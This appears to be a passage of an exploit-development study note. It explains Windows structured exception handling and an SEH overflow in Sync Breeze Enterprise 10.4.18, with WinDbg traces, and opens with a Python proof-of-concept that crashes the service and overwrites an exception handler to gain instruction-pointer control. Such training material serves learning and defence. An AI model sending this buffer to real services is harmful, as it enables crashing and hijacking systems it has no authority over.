# Analyzing public exploit
- Vulnerable Binary: Sync Breeze Enterprise v10.4.18

Let's try to use the public exploit to trigger a crash:
```python
#!/usr/bin/python  
import socket  
import sys  
from struct import pack  
try:  
 server = "192.168.122.113"  
 port = 9121  
 size = 1000  
 inputBuffer = b"\x41" * size  
 header = b"\x75\x19\xba\xab"  
 header += b"\x03\x00\x00\x00"  
 header += b"\x00\x40\x00\x00"  
 header += pack('<I', len(inputBuffer))  
 header += pack('<I', len(inputBuffer))  
 header += pack('<I', inputBuffer[-1])  
 buf = header + inputBuffer  
 print("Sending evil buffer...")  
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
 s.connect((server, port))  
 s.send(buf)  
 s.close()  
  
 print("Done!")  
except socket.error:  
 print("Could not connect!")
```

When we execute the exploit, we see that the EAX register is overwritten, but not the EIP...
Seems like at this moment the EIP register is not directly under our control.
Also, there is some data in the stack that contains part of our payload:
![](content/images/post_images/osed_2.png)

Let's see all the registers and confirm that EAX is the only register under our control:
![](content/images/post_images/osed_2_1.png)

Let's examine the crash. The crash says:
```
(113c.1164): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.

```
This means that the debugger intercepted a first chance exception, which is like a unexpected error.
Let's handle it continuing the program by pressing "g".
We can see that we got another access violation, now controlling the EIP.
![](content/images/post_images/osed_2_2.png)

To understand how this exploit worked and how we got control over the EIP, we have to talk about the SEH.

# SEH
We must understand what happens when **an exception occurs inside an application**.
As mentioned in the previous section, exceptions are unexpected events that occur during normal program execution.
There are two kinds of exceptions: **hardware exceptions and software exceptions**. 
- Hardware exceptions are initiated by the CPU. We encountered a typical hardware exception when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address. Hardware exceptions are exceptions that are not made by the programmer, but occur when the logic in the assembly code fails.
- On the other hand, software exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. For example, a software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument. They are exceptions but controlled in the software layer. 

**Normally the exception handling is programmed via try/except blocks.** In Windows, when doing a try/except block, the code will leverage the SEH (Structure Exception Handling) implemented by the Windows OS to handle the unexpected event.

SEH is implemented in **the operative system (Windows)** to manage **what to do when an unexpected action occurs in the execution of a thread.** When a thread faults, the OS calls a set of functions, called **function handlers**, which can correct the exception, provide more information about the unexpected condition, etc.
The **exception handlers are user-defined and created during the creation of the try/except code blocks.**
So, the SEH is the mechanism created by the OS that executes our exception handlers (created by developers) when an exception fails.
**Important note: There is a special DEFAULT exception handler which is defined by the OS, the rest are programmed by the developer.**

When an unexpected event occurs, the OS must locates the correct exception handler. 
Note that the exception handling occurs **at a thread level.**
Each thread in a program can be identified by a TEB (Thread Environment Block) structure, a struct that stores important information about such thread.
Each time a try block is found during the execution of a thread, a pointer to the **corresponding exception handler is saved on the stack in the `_EXCEPTION_REGISTRATION_RECORD` structure**. 
As there might be different try blocks chained in the single thread (a try inside a try), these structures are connected in the stack **in a linked list**, as the following image details:
![](content/images/post_images/osed_2_3.png)

In the case that the exception occurs, the OS inspects the TEB structure of the thread that has the exception and retrieves a pointer (**ExceptionList**) to the linked list of `_EXCEPTION_REGISTRATION_RECORD`. 
How does the OS retrieves information of the TEB? Well, the FS register at offset 0 (`fs:[0]`) stores a pointer to the TEB structure of that thread.
After retrieving the Exception List, the OS will walk and **invoke each of the exception handler functions stored in the stack until one of them can deal with the unexpected event.** If none of the defined functions can handle the exception, the OS invokes the **default exception handler, which is always the last node in the linked list. This exception handler terminates the current process (or thread if the application is a system service)**.

TL; DR, the TEB of a thread has a pointer called ExceptionList that points to the linked list of `_EXCEPTION_REGISTRATION_RECORD` in the stack. The pointer is to the first exception, as the rest are chained by following the "Next" attribute of the exception. Each of these handlers is called to manage the exception when it occurs. If none of then can manage the exception, the program exits or the thread ends, in case of a service.


## SEH internals

Let's analyze the TEB structure:
```c
0:009> dt nt!_TEB
ntdll!_TEB
   +0x000 NtTib            : _NT_TIB
   +0x01c EnvironmentPointer : Ptr32 Void
   +0x020 ClientId         : _CLIENT_ID
   +0x028 ActiveRpcHandle  : Ptr32 Void
   +0x02c ThreadLocalStoragePointer : Ptr32 Void
   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
   +0x034 LastErrorValue   : Uint4B
   +0x038 CountOfOwnedCriticalSections : Uint4B
   +0x03c CsrClientThread  : Ptr32 Void
   +0x040 Win32ThreadInfo  : Ptr32 Void
   +0x044 User32Reserved   : [26] Uint4B
   +0x0ac UserReserved     : [5] Uint4B
   +0x0c0 WOW32Reserved    : Ptr32 Void
   +0x0c4 CurrentLocale    : Uint4B
   +0x0c8 FpSoftwareStatusRegister : Uint4B
   +0x0cc ReservedForDebuggerInstrumentation : [16] Ptr32 Void
   +0x10c SystemReserved1  : [26] Ptr32 Void
   +0x174 PlaceholderCompatibilityMode : Char
   +0x175 PlaceholderHydrationAlwaysExplicit : UChar
   +0x176 PlaceholderReserved : [10] Char
   +0x180 ProxiedProcessId : Uint4B
   +0x184 _ActivationStack : _ACTIVATION_CONTEXT_STACK
   +0x19c WorkingOnBehalfTicket : [8] UChar
   +0x1a4 ExceptionCode    : Int4B
   +0x1a8 ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK
   +0x1ac InstrumentationCallbackSp : Uint4B
   +0x1b0 InstrumentationCallbackPreviousPc : Uint4B
   +0x1b4 InstrumentationCallbackPreviousSp : Uint4B
   +0x1b8 InstrumentationCallbackDisabled : UChar
   +0x1b9 SpareBytes       : [23] UChar
   +0x1d0 TxFsContext      : Uint4B
   +0x1d4 GdiTebBatch      : _GDI_TEB_BATCH
   +0x6b4 RealClientId     : _CLIENT_ID
   +0x6bc GdiCachedProcessHandle : Ptr32 Void
   +0x6c0 GdiClientPID     : Uint4B
   +0x6c4 GdiClientTID     : Uint4B
   +0x6c8 GdiThreadLocalInfo : Ptr32 Void
   +0x6cc Win32ClientInfo  : [62] Uint4B
   +0x7c4 glDispatchTable  : [233] Ptr32 Void
   +0xb68 glReserved1      : [29] Uint4B
   +0xbdc glReserved2      : Ptr32 Void
   +0xbe0 glSectionInfo    : Ptr32 Void
   +0xbe4 glSection        : Ptr32 Void
   +0xbe8 glTable          : Ptr32 Void
   +0xbec glCurrentRC      : Ptr32 Void
   +0xbf0 glContext        : Ptr32 Void
   +0xbf4 LastStatusValue  : Uint4B
   +0xbf8 StaticUnicodeString : _UNICODE_STRING
   +0xc00 StaticUnicodeBuffer : [261] Wchar
   +0xe0c DeallocationStack : Ptr32 Void
   +0xe10 TlsSlots         : [64] Ptr32 Void
   +0xf10 TlsLinks         : _LIST_ENTRY
   +0xf18 Vdm              : Ptr32 Void
   +0xf1c ReservedForNtRpc : Ptr32 Void
   +0xf20 DbgSsReserved    : [2] Ptr32 Void
   +0xf28 HardErrorMode    : Uint4B
   +0xf2c Instrumentation  : [9] Ptr32 Void
   +0xf50 ActivityId       : _GUID
   +0xf60 SubProcessTag    : Ptr32 Void
   +0xf64 PerflibData      : Ptr32 Void
   +0xf68 EtwTraceData     : Ptr32 Void
   +0xf6c WinSockData      : Ptr32 Void
   +0xf70 GdiBatchCount    : Uint4B
   +0xf74 CurrentIdealProcessor : _PROCESSOR_NUMBER
   +0xf74 IdealProcessorValue : Uint4B
   +0xf74 ReservedPad0     : UChar
   +0xf75 ReservedPad1     : UChar
   +0xf76 ReservedPad2     : UChar
   +0xf77 IdealProcessor   : UChar
   +0xf78 GuaranteedStackBytes : Uint4B
   +0xf7c ReservedForPerf  : Ptr32 Void
   +0xf80 ReservedForOle   : Ptr32 Void
   +0xf84 WaitingOnLoaderLock : Uint4B
   +0xf88 SavedPriorityState : Ptr32 Void
   +0xf8c ReservedForCodeCoverage : Uint4B
   +0xf90 ThreadPoolData   : Ptr32 Void
   +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void
   +0xf98 MuiGeneration    : Uint4B
   +0xf9c IsImpersonating  : Uint4B
   +0xfa0 NlsCache         : Ptr32 Void
   +0xfa4 pShimData        : Ptr32 Void
   +0xfa8 HeapData         : Uint4B
   +0xfac CurrentTransactionHandle : Ptr32 Void
   +0xfb0 ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME
   +0xfb4 FlsData          : Ptr32 Void
   +0xfb8 PreferredLanguages : Ptr32 Void
   +0xfbc UserPrefLanguages : Ptr32 Void
   +0xfc0 MergedPrefLanguages : Ptr32 Void
   +0xfc4 MuiImpersonation : Uint4B
   +0xfc8 CrossTebFlags    : Uint2B
   +0xfc8 SpareCrossTebBits : Pos 0, 16 Bits
   +0xfca SameTebFlags     : Uint2B
   +0xfca SafeThunkCall    : Pos 0, 1 Bit
   +0xfca InDebugPrint     : Pos 1, 1 Bit
   +0xfca HasFiberData     : Pos 2, 1 Bit
   +0xfca SkipThreadAttach : Pos 3, 1 Bit
   +0xfca WerInShipAssertCode : Pos 4, 1 Bit
   +0xfca RanProcessInit   : Pos 5, 1 Bit
   +0xfca ClonedThread     : Pos 6, 1 Bit
   +0xfca SuppressDebugMsg : Pos 7, 1 Bit
   +0xfca DisableUserStackWalk : Pos 8, 1 Bit
   +0xfca RtlExceptionAttached : Pos 9, 1 Bit
   +0xfca InitialThread    : Pos 10, 1 Bit
   +0xfca SessionAware     : Pos 11, 1 Bit
   +0xfca LoadOwner        : Pos 12, 1 Bit
   +0xfca LoaderWorker     : Pos 13, 1 Bit
   +0xfca SkipLoaderInit   : Pos 14, 1 Bit
   +0xfca SpareSameTebBits : Pos 15, 1 Bit
   +0xfcc TxnScopeEnterCallback : Ptr32 Void
   +0xfd0 TxnScopeExitCallback : Ptr32 Void
   +0xfd4 TxnScopeContext  : Ptr32 Void
   +0xfd8 LockCount        : Uint4B
   +0xfdc WowTebOffset     : Int4B
   +0xfe0 ResourceRetValue : Ptr32 Void
   +0xfe4 ReservedForWdf   : Ptr32 Void
   +0xfe8 ReservedForCrt   : Uint8B
   +0xff0 EffectiveContainerId : _GUID

```

Inside this structure, at offset 0x0, there is the `_NT_TIB` structure.
Let's analyze it.
```cpp
0:009> dt _NT_TIB
ntdll!_NT_TIB
   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 StackBase        : Ptr32 Void
   +0x008 StackLimit       : Ptr32 Void
   +0x00c SubSystemTib     : Ptr32 Void
   +0x010 FiberData        : Ptr32 Void
   +0x010 Version          : Uint4B
   +0x014 ArbitraryUserPointer : Ptr32 Void
   +0x018 Self             : Ptr32 _NT_TIB
```

We have the pointer called **ExceptionList** which points at a `_EXCEPTION_REGISTRATION_RECORD` structure.
Let's analyze this structure:
```cpp
0:009> dt _EXCEPTION_REGISTRATION_RECORD
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : Ptr32     _EXCEPTION_DISPOSITION 
```

We can see that this structure has a pointer to another `_EXCEPTION_REGISTRATION_RECORD` structure and a pointer to the Handler of this record.
The Handler parameter points **to a callback function called `_except_handler`** which returns a `_EXCEPTION_DISPOSITION` structure. Let's see the `_except_handler` function prototype (not implementation, only parameters):

```cpp
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (
IN PEXCEPTION_RECORD ExceptionRecord, 
IN VOID EstablisherFrame, 
IN OUT PCONTEXT ContextRecord, 
IN OUT PDISPATCHER_CONTEXT DispatcherContext );
```
The `_except_handler` function can have different names depending on the OS (e.g, it is also called `ntdll!_except_handler4`). Depending on the Symbols provided for each version of Windows, it changes. However, the parameters and return value of the function are always the same.

**Note that this is the function that gets executed to manage the exception!** This is the important thing to know.

We are interested on the second and third parameters of the EXCEPTION_DISPOSITION structure. These parameters are EstablisherFrame and ContextRecord.
- EstablisherFrame points to the `_EXCEPTION_REGISTRATION_RECORD` structure, which is used to handle the exception.
- ContextRecord is a pointer to a CONTEXT structure, which contains processor-specific register data at the time the exception was raised. 

Let's analyze the CONTEXT Structure in WinDbg. We can see that it contains many fields and also the states of **all of our registers, including the EIP**:
```cpp
0:009> dt _CONTEXT
ntdll!_CONTEXT
   +0x000 ContextFlags     : Uint4B
   +0x004 Dr0              : Uint4B
   +0x008 Dr1              : Uint4B
   +0x00c Dr2              : Uint4B
   +0x010 Dr3              : Uint4B
   +0x014 Dr6              : Uint4B
   +0x018 Dr7              : Uint4B
   +0x01c FloatSave        : _FLOATING_SAVE_AREA
   +0x08c SegGs            : Uint4B
   +0x090 SegFs            : Uint4B
   +0x094 SegEs            : Uint4B
   +0x098 SegDs            : Uint4B
   +0x09c Edi              : Uint4B
   +0x0a0 Esi              : Uint4B
   +0x0a4 Ebx              : Uint4B
   +0x0a8 Edx              : Uint4B
   +0x0ac Ecx              : Uint4B
   +0x0b0 Eax              : Uint4B
   +0x0b4 Ebp              : Uint4B
   +0x0b8 Eip              : Uint4B
   +0x0bc SegCs            : Uint4B
   +0x0c0 EFlags           : Uint4B
   +0x0c4 Esp              : Uint4B
   +0x0c8 SegSs            : Uint4B
   +0x0cc ExtendedRegisters : [512] UChar

```

When the exception is handled, this CONTEXT information will be used **to restore the execution flow after handling the exception**, reverting the register information, etc. In case that any register is modified during the exception, this is like a wayback machine.

As mentioned earlier, the `_except_handler` function returns a `_EXCEPTION_DISPOSITION`structure. 
If we inspect this structure, we can see that it contains the result of the exception handling process:
```cpp
0:009> dt _EXCEPTION_DISPOSITION
ntdll!_EXCEPTION_DISPOSITION
   ExceptionContinueExecution = 0n0
   ExceptionContinueSearch = 0n1
   ExceptionNestedException = 0n2
   ExceptionCollidedUnwind = 0n3
```

If the exception handler invoked by the OS is not valid for dealing with the exception, the return value will be ExceptionContinueSearch. This results in inspecting the "Next" pointer of the structure to move on to the next ` _EXCEPTION_REGISTRATION_RECORD` structure in the linked list.
In the case that this handler is valid to handle the exception, it will return ExceptionContinueExecution, meaning that the execution can continue.

This is a diagram that details the process of SEH, as we have explained previously. 
Basically consists in:
- Getting TEB address.
- Accessing 0x0 of TEB to get NT_TIB
- Accessing 0x0 of NT_TIB to get a pointer to the first `_EXCEPTION_REGISTRATION_RECORD` of the stack.
- Try to execute the associated `_except_handler` of such `_EXCEPTION_REGISTRATION_RECORD`.
- Depending on the `_EXCEPTION_DISPOSITION` return value of the function, navigate to the next `_EXCEPTION_REGISTRATION_RECORD` of the stack to keep managing the exception, or continue with the execution:

![](content/images/post_images/osed_2_4.png)

Now, let's see in details how the OS calls the exception handler functions and what checks are performed before invoking them.
When an exception is found, `ntdll!KiUserExceptionDispatcher` is called. This function is the responsible for **dispatching exceptions on Windows OS**.
The function takes two arguments:
- A `_EXCEPTION_RECORD` structure, that contains information about the exception.
- A `CONTEXT` structure, with information about the running context of the thread (e.g., registers).

Eventually this function will call the `RtlDispatchException` , which will retrieve the TEB and proceed to parse the ExceptionList through the mechanism already explained.
During the process of going through all the exceptions, for each **Handler** member in the list, the OS will ensure that the `_EXCEPTION_REGISTRATION_RECORD` structure falls within the stack memory limits found in the TEB.
Also, more checks to the exception handler function are performed usng the `RtlIsValidHandler` function.


`RtlIsValidHandler` is the responsible for the **SafeSEH** implementation. This is a mitigation introduced by Microsoft to prevent an attacker from gaining control of the execution flow after overwriting a stack-based exception handler.
At a high level, if a module is compiled with the SafeSEH flag, the linker will produce an **image containing a table of safe exception handlers.** 
The operating system will then validate the **exception_handler** on the stack by comparing it to the **entries in the table of safe exception handlers**. If the handler is not found, the system will refuse to execute it.

Unfortunately, the source code for RtlIsValidHandler is not publicly available, so we must instead analyze the pseudo-code that was generated by security researchers after reverse engineering this function on Windows 8.1. This code will be similar to what the Windows 10 OS does, so we can analyze it:
```cpp
BOOL RtlIsValidHandler(Handler) // NT 6.3.9600 
	{ 
		if (/* Handler within the image */) { 
			if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH) 
				goto InvalidHandler; 
			if (/* The image is .Net assembly, 'ILonly' flag is enabled */) 
				goto InvalidHandler; 
			if (/* Found 'SafeSEH' table */) {
				 if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its cache), or the initialization of the process is not complete */) { 
					 if (/* Handler found in 'SafeSEH' table */) 
						 return TRUE;
						 else goto InvalidHandler; 
					 } 
				 return TRUE; 
			 } 
			 else { 
				 if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled in 'ExecuteOptions' of the process */) 
					 return TRUE;
				if (/* Handler is in non-executable area of the memory */) {
					  if (ExecuteDispatchEnable) return TRUE; 
				  } 
				else if (ImageDispatchEnable) return TRUE; 
			} 
			InvalidHandler: 
				RtlInvalidHandlerDetected(...); 
				return FALSE;
	}			
```

By seeing the code, we can see that the functions checks the **DllCharacteristics** of the specific module where the exception occurs. If the module is compiled with SafeSEH, the Handler function will be compared against the entries of the table of the SafeSEH handlers before it is executed.
If the function succeeds, validating the Handler, the OS will call `RtlpExecuteHandlerForException`. This function will set up the appropiate arguments and invoke `ExecuteHandler`, which will end executing the `_except_handler` function.
This process is done for each of the handlers, to validate each of them.

To enable this functionality in a binary, the binary must be compiled with the `/SAFESEH` flag.

In summary, whenever an exception occurs, the operating system calls a designated set of functions as part of the SEH mechanism. Within these function calls, the **ExceptionList** singlelinked list is gathered from the TEB structure.
Next, the operating system parses the singly-linked list of `_EXCEPTION_REGISTRATION_RECORD` structures, performing various checks before calling the `exception_handler` function pointed to by each Handler member. This continues until a handler is found that will successfully process the exception and allow execution to continue.
If no handler can successfully handle the exception, the application will crash.

# SEH overflows
A SEH overflow is a stack based buffer overflow that is large enough or positioned in such a way that **it is possible to overwrite valid registered exception handlers on the stack.** By overwriting these handlers, the attacker can take control of the instruction pointer after triggering an exception.

This type of overflow **bypasses** the GS flag (stack cookies) as these cookies are positioned next to the return value of the vulnerable function. With this attack, the exception handler is modified and the instruction pointer is redirected to the address of the exception handler prior to reaching the end of the vulnerable function (in which the check is performed).

**Note: as the `_EXCEPTION_REGISTRATION_RECORD`** structures (the ones we want to modify) are stored at the beginning of the stack space (high addresses), the overflow needs to be quite large or begin near the beginning of the stack in order for the attacker to overwrite a structured exception handler.

Let's inspect our chain of `_EXCEPTION_REGISTRATION_RECORDS`in our victim process without tampering it first.
Because the SEH mechanism works on a per-thread basis, we won’t be able to inspect the intact SEH chain for the thread handling our incoming data, as that thread has not yet spawned. Instead, we will inspect the chain of `p _EXCEPTION_REGISTRATION_RECORD` structures for the thread WinDbg breaks into when we attach the debugger to the target process. This will reveal an intact chain.

Let's use the "teb" command in WinDbg to display the TEB address. We can see that we hace the ExceptionList pointer:
```c
0:008> !teb
TEB at 003db000
    ExceptionList:        00a0ff60
    StackBase:            00a10000
    StackLimit:           00a0c000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 003db000
    EnvironmentPointer:   00000000
    ClientId:             00000938 . 000018f8
    RpcHandle:            00000000
    Tls Storage:          00000000
    PEB Address:          003c9000
    LastErrorValue:       0
    LastStatusValue:      0
    Count Owned Locks:    0
    HardErrorMode:        0
```
We see that it is near 0x0, which means that it is close to the base of the stack of the thread.
Let's dump the first `_EXCEPTION_REGISTRATION_RECORD` structure at the memory address of the ExceptionList pointer.
From the previous section, we know that the `_EXCEPTION_REGISTRATION_RECORD` structure has two members. The first is Next and, as the name suggests, it points to the next entry in the singly-linked list. The second, Handler, is the memory address of the `_except_handler` function. 
We can manually walk the singly-linked list in the debugger as shown in the listing below:
```c
0:008> dt _EXCEPTION_REGISTRATION_RECORD 00a0ff60
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x00a0ffcc _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77308b10     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
```

We can iterate over the "Next" argument to see how much records there are in the stack. Let's do it:
```c
0:008> dt _EXCEPTION_REGISTRATION_RECORD 00a0ff60
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x00a0ffcc _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77308b10     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
0:008> dt _EXCEPTION_REGISTRATION_RECORD 00a0ffcc
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x00a0ffe4 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x77308b10     _EXCEPTION_DISPOSITION  ntdll!_except_handler4+0
0:008> dt _EXCEPTION_REGISTRATION_RECORD 00a0ffe4
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x773163cf     _EXCEPTION_DISPOSITION  ntdll!FinalExceptionHandlerPad47+0
```
We see that the last member of the list has a "Next" pointer to 0xffffffff. This last record **is the default exception handler specified by the OS, the one that ends the thread or program. Note that the associated `_EXCEPTION_DISPOSITION` value is different from the others!**

Now, let's trigger the crash with the exploit again to see what happens during a SEH overflow.
Once we send the exploit, let's walk the ExceptionList again. Oh, wait! the second `_EXCEPTION_REGISTRATION_RECORD` structure has been overwritten by our buffer!
```c
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0090fe0c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0090ff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x1008df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
0:007> dt _EXCEPTION_REGISTRATION_RECORD 0090ff44
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x41414141     _EXCEPTION_DISPOSITION  +41414141
```

Note that `_EXCEPTION_REGISTRATION_RECORD` structures are pushed on the stack from first to last. Because of this, SEH overflows generally overwrite the last `_EXCEPTION_REGISTRATION_RECORD` structure first, as it is the nearest to reach.
Keep in mind that in some cases, the overflow happens in such a way **that the exception chain is only partially overwritten**.

The exception occurs because the application is trying to read and execute an unmapped memory page. This causes an access violation exception that needs to be handled by the application or the OS.

Let's display all the exception handlers of the current thread with the !exchain extension:
```c
0:007> !exchain
0090fe0c: libpal!md5_starts+149fb (1008df5b)
0090ff44: 41414141
Invalid exception stack at 41414141
```
This little program which follows the exception chain tells us the same as our manual analysis: we have managed to overwrite an exception handler.

For now, we know that the first step in the SEH overflow is to obtain the address of the first `_EXCEPTION_REGISTRATION_RECORD` structure from the TEB. Then the OS proceeds to call each of the `_exception_handler` functions until the exception has been handled, or crashes if no handler could deal with the exception.

At this point, however, the address of at least one of the `_except_handler` functions has been overwritten by our buffer (**0x41414141**).
This means that whenever this `_EXCEPTION_REGISTRATION_RECORD`structure is used to handle the exception, the CPU will end up calling 0x41414141, giving us control over the EIP register. This is exactly the behavior we noticed as part of the initial crash analysis. **Note that the previous exceptions need to not be able to manage the exception, so that the exception handling mechanism manages to execute our function in order to try to handle the exception.**

We can confirm this by resuming execution inserting "g" in WinDbg and let the application handle the exception, which leads us to see that EIP has been modified to point to our code:
```c
0:007> g
(938.1d54): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000
eip=41414141 esp=0090f440 ebp=0090f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
```

Let's inspect the call stack with the "k" command to see which functions were called before the EIP was overwritten:
```c
0:007> k
 # ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
00 0090f43c 77316252 0x41414141
01 0090f460 77316224 ntdll!ExecuteHandler2+0x26
02 0090f528 77302cb6 ntdll!ExecuteHandler+0x24
03 0090f528 10012a9d ntdll!KiUserExceptionDispatcher+0x26
04 0090feb8 00000000 libpal!SCA_ConfigObj::Deserialize+0x1d
```

The output indicates that ntdll!ExecuteHandler2 was called directly before we achieved code execution. As previously discussed, this function is responsible for calling the _except_handler functions registered on the stack. We’ll confirm this shortly.

Okay, we have control over the instruction pointer, but we need to point it to our code. Let's see if any of the register points to our buffer. Also, let's inspect the stack frame to see if our payload is there:
```c
0:007> dds esp
0090f440  77316252 ntdll!ExecuteHandler2+0x26
0090f444  0090f540
0090f448  0090ff44
0090f44c  0090f55c
0090f450  0090f4cc
0090f454  0090fe0c
0090f458  77316270 ntdll!ExecuteHandler2+0x44
0090f45c  0090ff44
0090f460  0090f528
0090f464  77316224 ntdll!ExecuteHandler+0x24
0090f468  0090f540
0090f46c  0090ff44
0090f470  0090f55c
0090f474  0090f4cc
0090f478  41414141
0090f47c  0090ff44
0090f480  0090f540
0090f484  00000000
0090f488  772dd4db ntdll!RtlDispatchException+0x143
0090f48c  0090f540
0090f490  0090ff44
0090f494  0090f55c
0090f498  0090f4cc
0090f49c  41414141
0090f4a0  0090fb10
0090f4a4  0090ff08
0090f4a8  0090f540
0090f4ac  00000000
0090f4b0  0090f55c
0090f4b4  0090ff44
0090f4b8  00000032
0090f4bc  0090f000
0:007> r
eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000
eip=41414141 esp=0090f440 ebp=0090f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
```

According to the output in Listing 107, none of the registers point to our buffer at the moment we gain control over the execution. The ECX register is being overwritten alongside the instruction pointer while most of the other registers are NULL. We do not overwrite any data on the stack (which ESP and EBP point to). Lastly, EDX appears to point somewhere inside the ntdll!ExecuteHandler2 function. 

At this point, even if we control the instruction pointer, we are still not able to easily redirect the execution flow to our buffer where we’d eventually store a payload.

Let's put a breakpoint in ntdll!ExecuteHandler2 to stop the execution before WinDbg intercepts the exception. Then, let's crash the application again, and skip the first call to ntdll!ExecuteHandler2, because **the first exception handler has not been overwritten by us, and we want to go to the second exception handler.**
```c
(16cc.f30): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=41414141 ebx=0175fa0c ecx=0175ff08 edx=0175f9c4 esi=0175ff08 edi=0175fb10
eip=008d2a9d esp=0175f998 ebp=0175feb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
008d2a9d ff5024          call    dword ptr [eax+24h]  ds:0023:41414165=????????
0:010> bp ntdll!ExecuteHandler2
0:010> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000
eip=7731622c esp=0175f464 ebp=0175f528 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2:
7731622c 55              push    ebp
0:010> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000
eip=7731622c esp=0175f464 ebp=0175f528 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2:
7731622c 55              push    ebp
```

Once the breakpoint to the second exception handler has been triggered, let's inspect EIP to see more about this function:
```c
0:010> u @eip L11
ntdll!ExecuteHandler2:
7731622c 55              push    ebp
7731622d 8bec            mov     ebp,esp
7731622f ff750c          push    dword ptr [ebp+0Ch]
77316232 52              push    edx
77316233 64ff3500000000  push    dword ptr fs:[0]
7731623a 64892500000000  mov     dword ptr fs:[0],esp
77316241 ff7514          push    dword ptr [ebp+14h]
77316244 ff7510          push    dword ptr [ebp+10h]
77316247 ff750c          push    dword ptr [ebp+0Ch]
7731624a ff7508          push    dword ptr [ebp+8]
7731624d 8b4d18          mov     ecx,dword ptr [ebp+18h]
77316250 ffd1            call    ecx // This ends calling 0x41414141, our handler function! 
77316252 648b2500000000  mov     esp,dword ptr fs:[0]
77316259 648f0500000000  pop     dword ptr fs:[0]
77316260 8be5            mov     esp,ebp
77316262 5d              pop     ebp
77316263 c21400          ret     14h
```
The first thing worth mentioning in this code is that we are about to invoke a function by executing a “call ecx” instruction. 
According to the call stack that we say previously, after the call to ExecuteHandler2, we call the overwritten `_except_handler` function (0x41414141). Additionally, this function accepts four arguments as inferred from the four PUSH instructions preceding the “call ecx”. This matches the `_except_handler` function prototype, which is the following:
```cpp
typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (
IN PEXCEPTION_RECORD ExceptionRecord, 
IN VOID EstablisherFrame, 
IN OUT PCONTEXT ContextRecord, 
IN OUT PDISPATCHER_CONTEXT DispatcherContext );
```

If we analyze more in depth this function, we can see that the "ExceptionList" pointer of the TEB is being updated with a new `_EXCEPTION_REGISTRATION_RECORD`structure, in order to manage exceptions that might occur during the call of the `_except_handler` function. 
If we continue the execution of the function, we can see that, after updating the TEB, the "call" instruction is being performed to our controlled address:
```c
0:010> t
eax=00000000 ebx=00000000 ecx=6fdb73da edx=77316270 esi=00000000 edi=00000000
eip=7731624d esp=0175f444 ebp=0175f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!ExecuteHandler2+0x21:
7731624d 8b4d18          mov     ecx,dword ptr [ebp+18h] ss:0023:0175f478=41414141
0:010> t
eax=00000000 ebx=00000000 ecx=41414141 edx=77316270 esi=00000000 edi=00000000
eip=77316250 esp=0175f444 ebp=0175f460 iopl=0         nv up ei pl zr na pe nc
